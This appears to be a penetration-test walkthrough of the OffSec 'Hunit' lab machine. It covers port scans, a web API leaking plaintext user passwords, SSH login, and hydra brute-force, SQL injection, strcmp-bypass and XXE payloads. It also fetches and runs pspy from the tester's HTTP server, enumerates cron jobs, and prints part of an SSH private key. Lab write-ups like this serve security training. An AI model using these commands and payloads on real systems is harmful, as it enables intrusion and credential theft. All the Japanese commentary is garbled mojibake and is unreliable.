# Hunit

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.150.125  |
| Local IP          | 192.168.49.150   |
| Local listen port | 4444 |

## Nmap

- [x] Full TCP port scan

```bash
â”Œâ”€â”€(l3ickeyğŸƒkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ ports=$(nmap -p- --min-rate=1000 -T4 -Pn 192.168.150.125 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

```

```bash
â”Œâ”€â”€(l3ickeyğŸƒkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ nmap -p$ports -sV -A -Pn 192.168.150.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 20:53 JST
Nmap scan report for 192.168.150.125
Host is up (0.24s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Tue, 31 May 2022 11:53:23 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 31 May 2022 11:53:23 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Tue, 31 May 2022 11:53:24 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: My Haikus
|_http-open-proxy: Proxy might be redirecting requests
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=5/31%Time=629601B4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r\nDat
SF:e:\x20Tue,\x2031\x20May\x202022\x2011:53:23\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x20UP\
SF:n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\x20co
SF:mmercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(html5up\
SF:.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</title>\
SF:n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1,\x20user-scalable=no
SF:\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css\"\x2
SF:0/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t\t<!-
SF:-\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">\n\t\
SF:t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"row\">
SF:\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<header\x2
SF:0id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"logo\">
SF:My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t</div
SF:>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\n\n\t
SF:\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTTPOpti
SF:ons,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-L
SF:ength:\x200\r\nDate:\x20Tue,\x2031\x20May\x202022\x2011:53:23\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x20505\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x20465\r\nDate:\x20Tue,\x2031\x20May\x202022\x2011:
SF:53:24\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
SF:>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Sup
SF:ported</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,A
SF:rial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-
SF:color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x
SF:20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:blac
SF:k;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</st
SF:yle></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20V
SF:ersion\x20Not\x20Supported</h1></body></html>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.76 seconds

```

- [x] Well-known UDP port scan

```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ sudo nmap -Pn -sU --min-rate=10000 192.168.150.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 20:42 JST
Nmap scan report for 192.168.150.125
Host is up.
All 1000 scanned ports on 192.168.150.125 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds

```

## TCP
### HTTP - 8080

- [ ] Check software version

| software name | version | vulnerability                                                |
| ------------- | ------- | ------------------------------------------------------------ |
| HTML5 UP      |         |                                                              |
| Spring Boot?  |         | [Sprint Boot RCE](https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/deadpool.sh/_2017_RCE_Springs_/index.html) |

#### Enumeration

- [x] Directory buster
  - [x] /error
  
  ã‚¨ãƒ©ãƒ¼ãƒšãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã‚‹ï¼
  
  ![image-20220531222940354](/home/funa/.config/Typora/typora-user-images/image-20220531222940354.png)
  
  `Whitelabel Error Page` ã¨ã„ã†ã®ã¯ï¼Œ `Spring` ã§ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ãŸéš›ã«ã‚¨ãƒ©ãƒ¼ãƒšãƒ¼ã‚¸ãŒå­˜åœ¨ã—ãªã„ã¨ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã“ã®ã‚ˆã†ãªæŒ™å‹•ã«ãªã‚‹ï¼ã“ã®ã‚µãƒ¼ãƒã§ã¯ `Spring` ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ï¼
  
  - [x] /http%3A%2F%2Fwww
  
  ![image-20220531223832242](/home/funa/.config/Typora/typora-user-images/image-20220531223832242.png)
  
  - [x] /http%3A%2F%2Fyoutube
  
  ![image-20220531223907836](/home/funa/.config/Typora/typora-user-images/image-20220531223907836.png)
  
  - [x] /http%3A%2F%2Fblogs
  
  ![image-20220531223943227](/home/funa/.config/Typora/typora-user-images/image-20220531223943227.png)
  
  - [x] /**http%3A%2F%2Fwww
  
  ![image-20220531224010019](/home/funa/.config/Typora/typora-user-images/image-20220531224010019.png)


```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ gobuster dir -u http://192.168.150.125:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.150.125:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/31 21:03:48 Starting gobuster in directory enumeration mode
===============================================================
/error                (Status: 500) [Size: 105]
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 435]
/http%3A%2F%2Fblog    (Status: 400) [Size: 435]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 435]

===============================================================
2022/05/31 21:40:48 Finished
===============================================================

```

```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ gobuster dir -u http://192.168.150.125:8080/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.150.125:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/31 21:43:36 Starting gobuster in directory enumeration mode
===============================================================
/error                (Status: 500) [Size: 105]

===============================================================
2022/05/31 21:45:37 Finished
===============================================================

```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [x] Read page source

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚“ã§ã„ã‚‹ã¨ï¼Œ`http://localhost:8080/api/` ãŒã‚ã‚‹ã“ã¨ã‚’ç¤ºå”†ã™ã‚‹ã‚³ãƒ¡ãƒ³ãƒˆãŒã¿ã¤ã‹ã‚‹ï¼

```html
<section class="article">
	<header class="article-header">
		<h1 class="article-title">In a Station of the Metro</h1>
		<p class="article-meta">By  <strong>James</strong>, on <strong>2022-02-15 15th 2022</strong></p>
	</header>

	<div class="article-description">
		<div>Ezra Pound</div>
		<br>
		<br>
		<br>

		<p>The apparition of these faces in the crowd; Petals on a wet, black bough.</p>
	</div>
</section>

<!--
<a href="http://localhost:8080/api/">List all</a>
-->
```

`/api/` ã®ä¸­èº«ã¯ä¸‹è¨˜ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ï¼

```html
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]
```

`/api/user/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ï¼Œãƒ¦ãƒ¼ã‚¶åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒªã‚¹ãƒˆãŒè¡¨ç¤ºã•ã‚Œã‚‹ï¼

```bash
[{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},{"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}]
```

ã™ã¹ã¦è©¦ã™ã¨ï¼Œ`dademola:ExplainSlowQuest110` ã§ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚‹ï¼

```bash
â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ ssh dademola@192.168.150.125 -p 43022
The authenticity of host '[192.168.150.125]:43022 ([192.168.150.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.150.125]:43022' (ED25519) to the list of known hosts.
dademola@192.168.150.125's password:
[dademola@hunit ~]$ ls
blog.jar  local.txt  shared
[dademola@hunit ~]$ cat local.txt
54d04971afeef97d18c0b18be020df65

```

`local.txt` ã‚’æ‰‹ã«å…¥ã‚Œã‚‹ã“ã¨ãŒã§ããŸï¼

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

### SMB - 12445

| software name | version | vulnerability                                                |
| ------------- | ------- | ------------------------------------------------------------ |
| Samba smbd    | 4.6.2   | [CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494) |

- [x] Administrator login

  - [x] `Administrator:`

  ```bash
  â”Œâ”€â”€(l3ickeyğŸƒkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
  â””â”€$ smbclient -L 192.168.150.125 -p 12445 -U Administrator
  Password for [WORKGROUP\Administrator]:
  session setup failed: NT_STATUS_LOGON_FAILURE
  
  ```

- [ ] Check joe account login

  - [x] `james:james`
  - [x] `julie:julie`
  - [x] `jennifer:jennifer`
  - [x] `richard:richard`
  - [x] `admin:admin`
  - [x] `Administrator:Administrator`
  - [x] `James:`
  - [x] `Julie:`
  - [x] `Jennifer:`
  - [x] `Richard:`
  - [x] `James:James`
  - [x] `Julie:Julie`
  - [x] `Jennifer:Jennifer`
  - [x] `Richard:Richard`

  ```bash
  smbclient -L 192.168.150.125 -p 12445 -U joe
  ```

ã“ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã® `Samba` ã«ã¯èªè¨¼æ¸ˆã¿ã® RCE ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‹ã£ãŸã®ã§ï¼Œèªè¨¼æƒ…å ±ã‚’æ¢ã™ï¼

### HTTP - 18030

| software name | version         | vulnerability |
| ------------- | --------------- | ------------- |
| Apache httpd  | 2.4.46 ((Unix)) |               |
| PHP           |                 |               |

#### Enumeration

- [x] Directory buster

  - [x] /.hta

  ![image-20220531224847650](/home/funa/.config/Typora/typora-user-images/image-20220531224847650.png)

  - [x] /.htaccess
  - [x] /.htpasswd
  - [x] /~bin
  - [x] /~ftp
  - [x] /~nobody
  - [x] /~root
  - [x] /~mail
  - [x] /index.html

```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ gobuster dir -u http://192.168.150.125:18030/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.150.125:18030/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/31 21:54:12 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 969]
/.htaccess            (Status: 403) [Size: 969]
/.htpasswd            (Status: 403) [Size: 969]
/~bin                 (Status: 403) [Size: 969]
/~ftp                 (Status: 403) [Size: 969]
/~nobody              (Status: 403) [Size: 969]
/~root                (Status: 403) [Size: 969]
/~mail                (Status: 403) [Size: 969]
/index.html           (Status: 200) [Size: 886]

===============================================================
2022/05/31 21:56:10 Finished
===============================================================

```

```bash
â”Œâ”€â”€(l3ickeyğŸ‘»kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
â””â”€$ gobuster dir -u http://192.168.150.125:18030/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.150.125:18030/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/31 21:22:14 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2022/05/31 21:59:41 Finished
===============================================================

```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

#### Login brute force

- [ ] Default credentials

  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)

  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f 192.168.150.125 http-get /
  ```

  - [ ] passwords list

  ```bash
  hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f 192.168.150.125 http-get /
  ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

### 

### SSH - 43022

| software name | version            | vulnerability |
| ------------- | ------------------ | ------------- |
| OpenSSH       | 8.4 (protocol 2.0) |               |

- [ ] Brute-force attack

  - [x] default credentials

  ```bash
  â”Œâ”€â”€(l3ickeyğŸƒkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
  â””â”€$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.150.125:43022 -V -f -t 60
  <snip>
  1 of 1 target completed, 0 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-31 21:23:37
  
  ```

  - [ ] passwords list
    - [x] James
    - [x] Julie
    - [x] Jennifer
    - [x] Richard
    - [x] james
    - [x] julie
    - [x] jennifer
    - [x] richard


  ```bash
  â”Œâ”€â”€(l3ickeyğŸ¥ºkali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Hunit]
  â””â”€$ hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.150.125:43022 -V -f -t 60
  <snip>
  1 of 1 target completed, 0 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-31 21:53:22
  
  ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ssh joe@192.168.150.125
  ```

  If `no matching host key type found` error occurs with this command, try the following.

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-dss username@192.168.150.125
  ```

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-rsa username@192.168.150.125
  ```

## Linux Privilege Escalation

- [x] List SUDO binaries

```bash
[dademola@hunit ~]$ sudo -l
-bash: sudo: command not found

```

- [x] Find SUID binaries

```bash
[dademola@hunit ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/ssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chage
/usr/bin/vmware-user-suid-wrapper
/usr/bin/su
/usr/bin/ksu
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount.cifs
/usr/bin/expiry
/usr/bin/unix_chkpwd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/crontab
/usr/bin/sg
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/suexec
/usr/bin/chsh

```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

- [ ] Find files owned by any group

```bash
find / -group any_group -type f 2>/dev/null
```

- [ ] Check `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

- [x] Check network connections

```bash
[dademola@hunit home]$ netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:43022           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:12445           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::18030                :::*                    LISTEN      -
tcp6       0      0 :::43022                :::*                    LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      465/java
tcp6       0      0 :::12445                :::*                    LISTEN      -

```

If the owner of the process is `root`, search prvesc.

- [ ] Enumerate scheduled jobs with [pspy](https://github.com/DominicBreuker/pspy)

```bash local
python3 -m http.server 8000
```

```bash remote
wget http://192.168.49.150:8000/pspy64
chmod +x pspy64
./pspy64
```

- [ ] Check [PayloadsAllTheThings Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã« `/git-server` ã¨ã„ã†ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒã¿ã¤ã‹ã‚‹ï¼

```bash
[dademola@hunit home]$ cd /
[dademola@hunit /]$ ls
bin   dev  git-server  lib    lost+found  opt   root  sbin  sys  usr
boot  etc  home        lib64  mnt         proc  run   srv   tmp  var

```

`/git-server` ã®ä¸­èº«ã‚’è¦‹ã¦ã¿ã‚‹ã¨ï¼Œ`git` ã®ãƒ•ã‚¡ã‚¤ãƒ«ã ã¨ã„ã†ã“ã¨ãŒã‚ã‹ã‚‹ï¼

```bash
[dademola@hunit /]$ cd git-server/
[dademola@hunit git-server]$ ls -la
total 40
drwxr-xr-x  7 git  git  4096 Nov  6  2020 .
drwxr-xr-x 18 root root 4096 Nov 10  2020 ..
-rw-r--r--  1 git  git    23 Nov  5  2020 HEAD
drwxr-xr-x  2 git  git  4096 Nov  5  2020 branches
-rw-r--r--  1 git  git    66 Nov  5  2020 config
-rw-r--r--  1 git  git    73 Nov  5  2020 description
drwxr-xr-x  2 git  git  4096 Nov  5  2020 hooks
drwxr-xr-x  2 git  git  4096 Nov  5  2020 info
drwxr-xr-x 16 git  git  4096 Nov  6  2020 objects
drwxr-xr-x  4 git  git  4096 Nov  5  2020 refs

```

`/home` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦‹ã‚‹ã¨ï¼Œ`git` ã¨ã„ã†ãƒ¦ãƒ¼ã‚¶ãŒã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚‹ï¼

```bash
[dademola@hunit home]$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov  5  2020 .
drwxr-xr-x 18 root     root     4096 Nov 10  2020 ..
drwx------  5 dademola dademola 4096 Jan 15  2021 dademola
drwxr-xr-x  4 git      git      4096 Nov  5  2020 git

```

`git` ãƒ¦ãƒ¼ã‚¶ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚·ã‚§ãƒ«ã¯ `git-shell` ã«ãªã£ã¦ã„ã‚‹ï¼

```bash
[dademola@hunit home]$ cat /etc/passwd
<snip>
git:x:1005:1005::/home/git:/usr/bin/git-shell

```

`/etc/crontab.bak` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã™ã‚‹ã¨ï¼Œ`/root/git-server/backups.sh`, `/root/pull.sh` ãŒå®šæœŸå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚‹ï¼

```bash
[dademola@hunit home]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh

```

ã“ã‚Œã‚‰ã®ã“ã¨ã‹ã‚‰äºˆæƒ³ã™ã‚‹ã¨ï¼Œ`git` ãƒ¦ãƒ¼ã‚¶ã¯`/root/git-server` ã«å¯¾ã™ã‚‹ `git push` ã‚³ãƒãƒ³ãƒ‰ãŒè¨±å¯ã•ã‚Œã¦ãŠã‚Šï¼Œ`/root` ãƒ¦ãƒ¼ã‚¶ã¯ `cron job`  ã«ã‚ˆã‚Š `git pull` ã‚’è¡Œã† `/root/pull.sh` ã¨ï¼Œãªã‚“ã‚‰ã‹ã®ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ã‚’è¡Œã† `/root/git-server/backups.sh` ãŒå®šæœŸå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ï¼

ã¾ãšã¯ `/git/.ssh` ã«ã‚ã‚‹éµã‚’ä½¿ã£ã¦ `ssh` ã§ `git` ãƒ¦ãƒ¼ã‚¶ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ï¼ã“ã®éš›éµã®æ¨©é™ã‚’ `600` ã¾ãŸã¯ `400` ã«ã™ã‚‹ã®ã‚’å¿˜ã‚Œãšã«ï¼

```bash
[dademola@hunit git]$ cd .ssh
[dademola@hunit .ssh]$ ls
authorized_keys  id_rsa  id_rsa.pub
[dademola@hunit .ssh]$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtvi+/zIFPzCfn2CBFxGtflgPf6jLxY9ZFEwZNHbQjg32p3cWbzQG
wRWNSVlBYzj6sXPjcWTRc7p08WHb9/85L0/f94lfXUIB9ptipL9EHxSUDxGroP60H9jJTj
0Kuety1G+xSyti++Qji6hxmuRrQ4e5Q6lBn84/CXAnRH6GLYFRywJEXQtLHCwtlhVEqP7H
